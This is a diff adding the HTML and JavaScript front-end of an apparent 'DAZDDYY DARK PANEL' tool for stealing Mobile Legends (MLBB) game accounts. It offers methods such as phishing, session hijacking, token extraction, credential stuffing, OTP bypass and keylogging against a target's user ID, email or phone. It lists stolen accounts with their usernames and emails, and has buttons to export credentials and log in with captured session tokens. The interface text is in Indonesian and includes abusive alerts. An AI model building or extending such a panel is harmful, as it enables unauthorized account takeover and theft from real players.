@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Grabber - DAZDDYY DARK PANEL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0a0a;
+            color: #fff;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo i {
+            font-size: 2rem;
+            color: #ff3366;
+        }
+
+        .logo h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-link {
+            color: #fff;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            transition: all 0.3s;
+        }
+
+        .nav-link:hover {
+            background: rgba(255, 51, 102, 0.1);
+            color: #ff3366;
+        }
+
+        .nav-link.active {
+            background: #ff3366;
+            color: #fff;
+        }
+
+        .page-header {
+            margin-bottom: 30px;
+        }
+
+        .page-header h2 {
+            font-size: 2rem;
+            color: #ff3366;
+            margin-bottom: 10px;
+        }
+
+        .page-header p {
+            color: #888;
+        }
+
+        .method-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .method-card {
+            background: rgba(20, 20, 20, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 25px;
+            transition: all 0.3s;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .method-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #ff3366, #ff6b6b);
+            transform: translateX(-100%);
+            transition: transform 0.3s;
+        }
+
+        .method-card:hover::before {
+            transform: translateX(0);
+        }
+
+        .method-card:hover {
+            transform: translateY(-5px);
+            border-color: #ff3366;
+        }
+
+        .method-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 51, 102, 0.1);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .method-icon i {
+            font-size: 1.8rem;
+            color: #ff3366;
+        }
+
+        .method-name {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .success-rate {
+            background: rgba(255, 51, 102, 0.2);
+            color: #ff3366;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+        }
+
+        .method-description {
+            color: #888;
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+        }
+
+        .difficulty {
+            display: inline-block;
+            padding: 4px 8px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+            font-size: 0.8rem;
+        }
+
+        .control-panel {
+            background: rgba(20, 20, 20, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 40px;
+        }
+
+        .control-panel h3 {
+            margin-bottom: 20px;
+            color: #ff3366;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #888;
+        }
+
+        .input-group input, .input-group select, .input-group textarea {
+            width: 100%;
+            padding: 15px;
+            background: #0a0a0a;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .input-group input:focus, .input-group select:focus, .input-group textarea:focus {
+            outline: none;
+            border-color: #ff3366;
+            box-shadow: 0 0 10px rgba(255, 51, 102, 0.3);
+        }
+
+        .btn {
+            padding: 15px 30px;
+            background: linear-gradient(135deg, #ff3366, #ff6b6b);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 20px rgba(255, 51, 102, 0.3);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .progress-section {
+            background: rgba(20, 20, 20, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 40px;
+            display: none;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff3366, #ff6b6b);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .result-section {
+            background: rgba(20, 20, 20, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 30px;
+        }
+
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .result-content {
+            background: #0a0a0a;
+            border-radius: 10px;
+            padding: 20px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .history-table {
+            margin-top: 30px;
+        }
+
+        .history-table table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .history-table th {
+            text-align: left;
+            padding: 15px 10px;
+            color: #888;
+            font-weight: 500;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .history-table td {
+            padding: 15px 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .history-table tr:hover {
+            background: rgba(255, 51, 102, 0.05);
+        }
+
+        .badge {
+            padding: 4px 8px;
+            background: rgba(255, 51, 102, 0.1);
+            border: 1px solid #ff3366;
+            border-radius: 4px;
+            color: #ff3366;
+            font-size: 0.8rem;
+        }
+
+        .badge-success {
+            background: rgba(0, 255, 0, 0.1);
+            border-color: #00ff00;
+            color: #00ff00;
+        }
+
+        .copy-btn {
+            padding: 5px 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+
+        .copy-btn:hover {
+            background: #ff3366;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <nav class="navbar">
+            <div class="logo">
+                <i class="fas fa-skull"></i>
+                <h1>DAZDDYY DARK PANEL</h1>
+            </div>
+            <div class="nav-links">
+                <a href="/" class="nav-link">
+                    <i class="fas fa-home"></i> Home
+                </a>
+                <a href="/dashboard" class="nav-link">
+                    <i class="fas fa-chart-line"></i> Dashboard
+                </a>
+                <a href="/grabber" class="nav-link active">
+                    <i class="fas fa-user-ninja"></i> Account Grabber
+                </a>
+            </div>
+        </nav>
+
+        <div class="page-header">
+            <h2>MLBB Account Grabber</h2>
+            <p>10+ metode buat ngambil akun MLBB. Pilih metode, target, and let's rock!</p>
+        </div>
+
+        <!-- Method Grid -->
+        <div class="method-grid" id="methodGrid">
+            <!-- Will be populated by JavaScript -->
+        </div>
+
+        <!-- Control Panel -->
+        <div class="control-panel">
+            <h3>Execute Grabber</h3>
+            <div class="input-group">
+                <label>Selected Method</label>
+                <input type="text" id="selectedMethod" readonly value="Select a method first">
+            </div>
+            <div class="input-group">
+                <label>Target (User ID / Email / Phone)</label>
+                <input type="text" id="targetInput" placeholder="Enter target...">
+            </div>
+            <div class="input-group">
+                <label>Additional Parameters (JSON)</label>
+                <textarea id="paramsInput" rows="3" placeholder='{"key": "value"}'></textarea>
+            </div>
+            <button class="btn" onclick="executeGrabber()">
+                <i class="fas fa-bolt"></i> Execute Grabber
+            </button>
+        </div>
+
+        <!-- Progress Section -->
+        <div class="progress-section" id="progressSection">
+            <h3>Grabbing in Progress...</h3>
+            <div id="progressMessage">Initializing...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+
+        <!-- Result Section -->
+        <div class="result-section">
+            <div class="result-header">
+                <h3>Result</h3>
+                <div>
+                    <button class="btn-secondary" onclick="copyResult()">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                    <button class="btn-secondary" onclick="saveResult()">
+                        <i class="fas fa-save"></i> Save
+                    </button>
+                </div>
+            </div>
+            <div class="result-content" id="resultContent">
+                No result yet. Execute a grabber to see results.
+            </div>
+        </div>
+
+        <!-- History -->
+        <div class="history-table">
+            <h3>Recent Grabs</h3>
+            <table id="historyTable">
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>Username</th>
+                        <th>Email</th>
+                        <th>Method</th>
+                        <th>Status</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td colspan="6" style="text-align: center; color: #888;">Loading...</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        let currentMethod = null;
+        let currentResult = null;
+
+        // Load available methods
+        async function loadMethods() {
+            try {
+                const response = await fetch('/api/grabber/methods');
+                const data = await response.json();
+                
+                if (data.success) {
+                    displayMethods(data.data);
+                }
+            } catch (error) {
+                console.error('Error loading methods:', error);
+            }
+        }
+
+        function displayMethods(methods) {
+            const grid = document.getElementById('methodGrid');
+            grid.innerHTML = '';
+            
+            methods.forEach(method => {
+                const card = document.createElement('div');
+                card.className = 'method-card';
+                card.onclick = () => selectMethod(method);
+                
+                // Icon mapping
+                const icons = {
+                    'phishing': 'fa-fish',
+                    'session_hijack': 'fa-cookie',
+                    'token_extract': 'fa-key',
+                    'bruteforce': 'fa-bolt',
+                    'credential_stuffing': 'fa-database',
+                    'social_engineering': 'fa-comments',
+                    'otp_bypass': 'fa-mobile-alt',
+                    'device_clone': 'fa-clone',
+                    'api_exploit': 'fa-bug',
+                    'keylogger': 'fa-keyboard'
+                };
+                
+                card.innerHTML = `
+                    <div class="method-icon">
+                        <i class="fas ${icons[method.id] || 'fa-user-ninja'}"></i>
+                    </div>
+                    <div class="method-name">
+                        ${method.name}
+                        <span class="success-rate">${method.success_rate}</span>
+                    </div>
+                    <div class="method-description">${method.description}</div>
+                    <div class="difficulty">${method.difficulty}</div>
+                `;
+                
+                grid.appendChild(card);
+            });
+        }
+
+        function selectMethod(method) {
+            currentMethod = method;
+            document.getElementById('selectedMethod').value = method.name;
+            
+            // Scroll to control panel
+            document.querySelector('.control-panel').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        async function executeGrabber() {
+            if (!currentMethod) {
+                alert('Pilih metode dulu kontol!');
+                return;
+            }
+            
+            const target = document.getElementById('targetInput').value;
+            if (!target) {
+                alert('Masukin target dulu goblok!');
+                return;
+            }
+            
+            let params = {};
+            try {
+                const paramsText = document.getElementById('paramsInput').value;
+                if (paramsText) {
+                    params = JSON.parse(paramsText);
+                }
+            } catch (e) {
+                alert('JSON parameter tidak valid!');
+                return;
+            }
+            
+            // Show progress
+            document.getElementById('progressSection').style.display = 'block';
+            document.getElementById('resultContent').innerHTML = 'Grabbing in progress...';
+            
+            try {
+                const response = await fetch('/api/grabber/grab', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        target: target,
+                        method: currentMethod.id,
+                        params: params
+                    })
+                });
+                
+                const data = await response.json();
+                if (!data.success) {
+                    alert('Error: ' + data.error);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error: ' + error.message);
+            }
+        }
+
+        // Socket.IO events
+        socket.on('grab_progress', function(data) {
+            document.getElementById('progressMessage').innerHTML = data.message;
+            if (data.progress) {
+                document.getElementById('progressFill').style.width = data.progress + '%';
+            }
+        });
+
+        socket.on('grab_complete', function(data) {
+            document.getElementById('progressSection').style.display = 'none';
+            
+            if (data.success) {
+                currentResult = data.data;
+                document.getElementById('resultContent').innerHTML = 
+                    '<pre>' + JSON.stringify(data.data, null, 2) + '</pre>';
+                loadHistory(); // Refresh history
+            } else {
+                document.getElementById('resultContent').innerHTML = 
+                    '<span style="color: #ff3366">Error: ' + data.error + '</span>';
+            }
+        });
+
+        // Load history
+        async function loadHistory() {
+            try {
+                const response = await fetch('/api/grabber/history');
+                const data = await response.json();
+                
+                if (data.success) {
+                    const tbody = document.querySelector('#historyTable tbody');
+                    tbody.innerHTML = '';
+                    
+                    data.data.forEach(item => {
+                        const row = document.createElement('tr');
+                        row.innerHTML = `
+                            <td>${new Date(item.stolen_at).toLocaleString()}</td>
+                            <td>${item.username || 'N/A'}</td>
+                            <td>${item.email || 'N/A'}</td>
+                            <td>${item.stolen_method}</td>
+                            <td><span class="badge badge-success">${item.status}</span></td>
+                            <td>
+                                <button class="copy-btn" onclick="viewAccount(${item.id})">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                                <button class="copy-btn" onclick="loginAccount(${item.id})">
+                                    <i class="fas fa-sign-in-alt"></i>
+                                </button>
+                            </td>
+                        `;
+                        tbody.appendChild(row);
+                    });
+                }
+            } catch (error) {
+                console.error('Error loading history:', error);
+            }
+        }
+
+        async function viewAccount(id) {
+            try {
+                const response = await fetch(`/api/grabber/export/${id}`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentResult = data.data;
+                    document.getElementById('resultContent').innerHTML = 
+                        '<pre>' + JSON.stringify(data.data, null, 2) + '</pre>';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function loginAccount(id) {
+            try {
+                const response = await fetch(`/api/grabber/login/${id}`, {
+                    method: 'POST'
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    alert('Login successful! Session token: ' + data.data.session_token);
+                } else {
+                    alert('Login failed: ' + data.error);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        function copyResult() {
+            if (currentResult) {
+                navigator.clipboard.writeText(JSON.stringify(currentResult, null, 2));
+                alert('Copied to clipboard!');
+            }
+        }
+
+        function saveResult() {
+            if (currentResult) {
+                const dataStr = JSON.stringify(currentResult, null, 2);
+                const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+                const exportFileDefaultName = `grabbed_${Date.now()}.json`;
+                
+                const linkElement = document.createElement('a');
+                linkElement.setAttribute('href', dataUri);
+                linkElement.setAttribute('download', exportFileDefaultName);
+                linkElement.click();
+            }
+        }
+
+        // Initial load
+        loadMethods();
+        loadHistory();
+
+        // Refresh history every 30 seconds
+        setInterval(loadHistory, 30000);
+    </script>
+</body>
+</html>
